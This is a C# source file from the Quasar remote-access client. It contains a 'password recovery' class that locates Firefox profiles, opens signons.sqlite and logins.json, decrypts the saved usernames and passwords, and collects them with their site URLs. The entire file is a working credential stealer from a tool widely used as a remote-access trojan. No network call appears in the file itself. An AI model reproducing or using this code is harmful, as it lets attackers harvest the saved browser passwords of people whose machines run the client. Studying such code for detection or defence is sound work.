using Quasar.Client.Helper;
using Quasar.Client.Recovery.Utilities;
using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;

namespace Quasar.Client.Recovery.Browsers
{
    public class FirefoxPassReader : IAccountReader
    {
        /// <inheritdoc />
        public string ApplicationName => "Firefox";

        /// <inheritdoc />
        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

            var logins = new List<RecoveredAccount>();
            if (dirs.Length == 0)
                return logins;

            foreach (string dir in dirs)
            {
                string signonsFile = string.Empty;
                string loginsFile = string.Empty;
                bool signonsFound = false;
                bool loginsFound = false;

                string[] files = Directory.GetFiles(dir, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }

                files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound || signonsFound)
                {
                    using (var decrypter = new FFDecryptor())
                    {
                        var r = decrypter.Init(dir);
                        if (signonsFound)
                        {
                            SQLiteHandler sqlDatabase;

                            if (!File.Exists(signonsFile))
                                return logins;

                            try
                            {
                                sqlDatabase = new SQLiteHandler(signonsFile);
                            }
                            catch (Exception)
                            {
                                return logins;
                            }


                            if (!sqlDatabase.ReadTable("moz_logins"))
                                return logins;

                            for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                            {
                                try
                                {
                                    var host = sqlDatabase.GetValue(i, "hostname");
                                    var user = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedUsername"));
                                    var pass = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedPassword"));

                                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                                    {
                                        logins.Add(new RecoveredAccount
                                        {
                                            Url = host,
                                            Username = user,
                                            Password = pass,
                                            Application = ApplicationName
                                        });
                                    }
                                }
                                catch (Exception)
                                {
                                    // 忽略无效条目
                                }
                            }
                        }

                        if (loginsFound)
                        {
                            FFLogins ffLoginData;
                            using (var sr = File.OpenRead(loginsFile))
                            {
                                ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
                            }

                            foreach (Login loginData in ffLoginData.Logins)
                            {
                                string username = decrypter.Decrypt(loginData.EncryptedUsername);
                                string password = decrypter.Decrypt(loginData.EncryptedPassword);
                                logins.Add(new RecoveredAccount
                                {
                                    Username = username,
                                    Password = password,
                                    Url = loginData.Hostname.ToString(),
                                    Application = ApplicationName
                                });
                            }
                        }
                    }
                }

            }

            return logins;
        }

        /// <summary>
        /// Firefox登录信息类
        /// </summary>
        [DataContract]
        private class FFLogins
        {
            /// <summary>
            /// 下一个ID
            /// </summary>
            [DataMember(Name = "nextId")]
            public long NextId { get; set; }

            /// <summary>
            /// 登录信息数组
            /// </summary>
            [DataMember(Name = "logins")]
            public Login[] Logins { get; set; }

            /// <summary>
            /// 潜在的易受攻击密码
            /// </summary>
            [IgnoreDataMember]
            [DataMember(Name = "potentiallyVulnerablePasswords")]
            public object[] PotentiallyVulnerablePasswords { get; set; }

            /// <summary>
            /// 按登录GUID忽略的违规警报
            /// </summary>
            [IgnoreDataMember]
            [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
            public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }

            /// <summary>
            /// 版本号
            /// </summary>
            [DataMember(Name = "version")]
            public long Version { get; set; }
        }

        /// <summary>
        /// 按登录GUID忽略的违规警报类
        /// </summary>
        [DataContract]
        private class DismissedBreachAlertsByLoginGuid
        {
        }

        /// <summary>
        /// 登录信息类
        /// </summary>
        [DataContract]
        private class Login
        {
            /// <summary>
            /// ID
            /// </summary>
            [DataMember(Name = "id")]
            public long Id { get; set; }

            /// <summary>
            /// 主机名
            /// </summary>
            [DataMember(Name = "hostname")]
            public Uri Hostname { get; set; }

            /// <summary>
            /// HTTP领域
            /// </summary>
            [DataMember(Name = "httpRealm")]
            public object HttpRealm { get; set; }

            /// <summary>
            /// 表单提交URL
            /// </summary>
            [DataMember(Name = "formSubmitURL")]
            public Uri FormSubmitUrl { get; set; }

            /// <summary>
            /// 用户名字段
            /// </summary>
            [DataMember(Name = "usernameField")]
            public string UsernameField { get; set; }

            /// <summary>
            /// 密码字段
            /// </summary>
            [DataMember(Name = "passwordField")]
            public string PasswordField { get; set; }

            /// <summary>
            /// 加密的用户名
            /// </summary>
            [DataMember(Name = "encryptedUsername")]
            public string EncryptedUsername { get; set; }

            /// <summary>
            /// 加密的密码
            /// </summary>
            [DataMember(Name = "encryptedPassword")]
            public string EncryptedPassword { get; set; }

            /// <summary>
            /// GUID
            /// </summary>
            [DataMember(Name = "guid")]
            public string Guid { get; set; }

            /// <summary>
            /// 加密类型
            /// </summary>
            [DataMember(Name = "encType")]
            public long EncType { get; set; }

            /// <summary>
            /// 创建时间
            /// </summary>
            [DataMember(Name = "timeCreated")]
            public long TimeCreated { get; set; }

            /// <summary>
            /// 最后使用时间
            /// </summary>
            [DataMember(Name = "timeLastUsed")]
            public long TimeLastUsed { get; set; }

            /// <summary>
            /// 密码更改时间
            /// </summary>
            [DataMember(Name = "timePasswordChanged")]
            public long TimePasswordChanged { get; set; }

            /// <summary>
            /// 使用次数
            /// </summary>
            [DataMember(Name = "timesUsed")]
            public long TimesUsed { get; set; }
        }
    }
}